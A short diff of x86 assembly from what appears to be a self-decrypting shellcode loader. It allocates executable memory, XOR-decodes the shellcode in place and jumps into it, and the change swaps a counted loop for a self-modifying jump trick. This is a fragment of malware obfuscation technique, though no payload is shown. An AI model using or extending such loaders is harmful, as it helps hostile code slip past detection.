@@ -25,8 +25,7 @@ PAGE_EXECUTE_READWRITE equ 40h
 @decryption:
 xor word ptr [eax], 06799h ; <jmp esi bytes> XOR <first two bytes of this instruction>
 add eax, sizeof word
-dec ecx
-loop @decryption
+jmp @decryption
 decryption_size equ $ - @decryption
 
 main proc
@@ -64,7 +63,6 @@ main proc
 
 	; setup decryption registers
 	mov esi, eax ; save the start of the decrypted shellcode
-	mov ecx, shellcode_size + decryption_size	
 	call ebx
 
 	mov esp, ebp
